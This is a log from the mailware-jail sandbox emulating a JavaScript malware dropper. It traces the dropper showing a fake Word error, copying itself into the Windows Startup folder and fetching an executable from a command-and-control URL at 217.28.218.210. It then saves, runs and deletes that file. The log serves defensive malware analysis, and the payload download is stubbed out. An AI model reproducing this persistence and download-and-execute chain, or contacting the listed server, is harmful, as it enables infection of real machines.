17 Dec 10:21:16 - mailware-jail, a malware sandbox ver. 0.11.1
17 Dec 10:21:16 - ------------------------
17 Dec 10:21:16 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/other.js,env/console.js
17 Dec 10:21:16 - Malware files: malware/20161216/malware.js
17 Dec 10:21:16 - Output file for sandbox dump: sandbox_dump_after.json
17 Dec 10:21:16 - Output directory for generated files: output/
17 Dec 10:21:16 - Download from remote server: false
17 Dec 10:21:16 - ==> Preparing Sandbox environment.
17 Dec 10:21:16 -  => Executing: env/utils.js quitely
17 Dec 10:21:16 -  => Executing: env/eval.js quitely
17 Dec 10:21:16 -  => Executing: env/function.js quitely
17 Dec 10:21:16 -  => Executing: env/wscript.js quitely
17 Dec 10:21:16 -  => Executing: env/other.js quitely
17 Dec 10:21:16 -  => Executing: env/console.js quitely
17 Dec 10:21:16 - ==> Executing malware file(s). =========================================
17 Dec 10:21:16 -  => Executing: malware/20161216/malware.js verbosely, reporting silent catches
17 Dec 10:21:16 - Saving: output/malware_20161216_malware.js
17 Dec 10:21:16 - WScript.scriptfullname = (string) 'malware/20161216/malware.js'
17 Dec 10:21:16 - WScript.arguments = (object) 'malware/20161216/malware.js,xyz'
17 Dec 10:21:16 - WScript.CreateObject(WScript.Shell)
17 Dec 10:21:16 - new WScript.Shell[2]
17 Dec 10:21:16 - ActiveXObject(Scripting.FileSystemObject)
17 Dec 10:21:16 - new Scripting.FileSystemObject[3]
17 Dec 10:21:16 - ActiveXObject(ADODB.Stream)
17 Dec 10:21:16 - new ADODB_Stream[4]
17 Dec 10:21:16 - ActiveXObject(Shell.Application)
17 Dec 10:21:16 - new Shell.Application[5]
17 Dec 10:21:16 - WScript.Shell[2].ExpandEnvironmentStrings(%TEMP%) => C:\Users\User\AppData\Local\Temp
17 Dec 10:21:16 - ActiveXObject(Msxml2.ServerXMLHTTP)
17 Dec 10:21:16 - new MSXML2.XMLHTTP[6]
17 Dec 10:21:16 - MSXML2.XMLHTTP[6].onreadystatechange = (undefined) 'undefined'
17 Dec 10:21:16 - new Folder2[7](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
17 Dec 10:21:16 - new FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
17 Dec 10:21:16 - FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).name = (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
17 Dec 10:21:16 - FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).path = (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
17 Dec 10:21:16 - Folder2[7](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).self = (object) 'FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)'
17 Dec 10:21:16 - Shell.Application[5].Namespace(7) => Folder2[7](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)
17 Dec 10:21:16 - WScript.scriptfullname.get() => (string) 'malware/20161216/malware.js'
17 Dec 10:21:16 - Folder2[7](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).self.get() => (object) 'FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup)'
17 Dec 10:21:16 - FolderItem[8](C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup).path.get() => (string) 'C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
17 Dec 10:21:16 - WScript.Popup(Word cannot open the document: user does not have access privileges,473,Error:,16)
17 Dec 10:21:16 - Scripting.FileSystemObject[3].CopyFile(malware/20161216/malware.js, C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\plugins.refresh.jse)
17 Dec 10:21:16 - Scripting.FileSystemObject[3].DeleteFile(malware/20161216/malware.js)
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].setOption(3,MSXML)
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].open(GET,https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&91&uid=1715861367&out=0&ver=20,false)
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].method = (string) 'GET'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].url = (string) 'https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&91&uid=1715861367&out=0&ver=20'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].async = (boolean) 'false'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].async.get() => (boolean) 'false'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].send(undefined)
17 Dec 10:21:24 - MSXML2.XMLHTTP[6] Not sending data, if you want to interact with remote server, set --down
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].status = (number) '200'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].readystate = (number) '4'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].onreadystatechange.get() => (undefined) 'undefined'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].send(undefined) finished
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].status.get() => (number) '200'
17 Dec 10:21:24 - FileExists: false overridden with FileAlwaysExists: true
17 Dec 10:21:24 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\109.exe) => true
17 Dec 10:21:24 - Scripting.FileSystemObject[3].DeleteFile(C:\Users\User\AppData\Local\Temp\109.exe)
17 Dec 10:21:24 - FileExists: false overridden with FileAlwaysExists: true
17 Dec 10:21:24 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\107.cc1) => true
17 Dec 10:21:24 - Scripting.FileSystemObject[3].DeleteFile(C:\Users\User\AppData\Local\Temp\107.cc1)
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].ResponseText.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
17 Dec 10:21:24 - ADODB_Stream[4].Open()
17 Dec 10:21:24 - ADODB_Stream[4].type = (number) '1'
17 Dec 10:21:24 - MSXML2.XMLHTTP[6].responsebody.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
17 Dec 10:21:24 - ADODB_Stream[4].content = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
17 Dec 10:21:24 - ADODB_Stream[4].Write(str) - 11202 bytes
17 Dec 10:21:24 - ADODB_Stream[4].size = (number) '11202'
17 Dec 10:21:24 - ADODB_Stream[4].position = (number) '0'
17 Dec 10:21:24 - ADODB_Stream[4].SaveToFile(C:\Users\User\AppData\Local\Temp\109.exe, undefined)
17 Dec 10:21:24 - ADODB_Stream[4].content.get() => (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
17 Dec 10:21:24 - ADODB_Stream[4].Close()
17 Dec 10:21:24 - WScript.Sleep(30000)
17 Dec 10:21:54 - FileExists: false overridden with FileAlwaysExists: true
17 Dec 10:21:54 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\109.exe) => true
17 Dec 10:21:54 - Scripting.FileSystemObject[3].GetFile(C:\Users\User\AppData\Local\Temp\109.exe) => C:\Users\User\AppData\Local\Temp\109.exe
17 Dec 10:21:54 - new FileObject[9](C:\Users\User\AppData\Local\Temp\109.exe)
17 Dec 10:21:54 - FileObject[9](C:\Users\User\AppData\Local\Temp\109.exe).OpenAsTextStream(1)
17 Dec 10:21:54 - new TextStream[10]
17 Dec 10:21:54 - TextStream[10].ReadLine()
17 Dec 10:21:54 - WScript.Shell[2].Exec(C:\Users\User\AppData\Local\Temp\109.exe)
17 Dec 10:21:54 - new Process[11](C:\Users\User\AppData\Local\Temp\109.exe)
17 Dec 10:21:54 - Process[11](C:\Users\User\AppData\Local\Temp\109.exe).processid = (number) '11'
17 Dec 10:21:54 - new TextStream[12]
17 Dec 10:21:54 - Process[11](C:\Users\User\AppData\Local\Temp\109.exe).stdout = (object) 'TextStream[12]'
17 Dec 10:21:54 - new TextStream[13]
17 Dec 10:21:54 - Process[11](C:\Users\User\AppData\Local\Temp\109.exe).stderr = (object) 'TextStream[13]'
17 Dec 10:21:54 - new TextStream[14]
17 Dec 10:21:54 - Process[11](C:\Users\User\AppData\Local\Temp\109.exe).stdin = (object) 'TextStream[14]'
17 Dec 10:21:54 - Process[11](C:\Users\User\AppData\Local\Temp\109.exe).processid.get() => (number) '11'
17 Dec 10:21:54 - WScript.Sleep(10010)
17 Dec 10:22:04 - FileExists: false overridden with FileAlwaysExists: true
17 Dec 10:22:04 - Scripting.FileSystemObject[3].FileExists(C:\Users\User\AppData\Local\Temp\109.exe) => true
17 Dec 10:22:04 - Scripting.FileSystemObject[3].DeleteFile(C:\Users\User\AppData\Local\Temp\109.exe)
17 Dec 10:22:04 - TextStream[10].Close()
17 Dec 10:22:04 - WScript.Sleep(120000)
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].setOption(3,MSXML)
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].open(GET,https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&178&uid=1715861367&out=11&ver=20,false)
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].method = (string) 'GET'
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].url = (string) 'https://217.28.218.210:4433/C1/ostap.php?add=theleadingfigureofabstractexpressionism&178&uid=1715861367&out=11&ver=20'
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].async = (boolean) 'false'
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].async.get() => (boolean) 'false'
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].send(undefined)
17 Dec 10:24:04 - MSXML2.XMLHTTP[6] Not sending data, if you want to interact with remote server, set --down
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].responsebody = (string) 'MZDumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --down to download the real payload.?Dumy conntent, use --dow ... (truncated)'
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].status = (number) '200'
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].readystate = (number) '4'
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].onreadystatechange.get() => (undefined) 'undefined'
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].send(undefined) finished
17 Dec 10:24:04 - MSXML2.XMLHTTP[6].status.get() => (number) '200'
17 Dec 10:24:04 - WScript.Shell[2].RegRead(HKEY_CLASSES_ROOT\\http\\shell\\open\\command\\) => "C:\Program Files (x86)\Mozilla Firefox\firefox.exe" -osint -url "%1"
17 Dec 10:24:04 - ==> Cleaning up sandbox.
17 Dec 10:24:04 - ==> Script execution finished, dumping sandbox environment to a file.
17 Dec 10:24:04 - The sandbox context has been  saved to: sandbox_dump_after.json
17 Dec 10:24:04 - Saving: output/C__Users_User_AppData_Local_Temp_109.exe
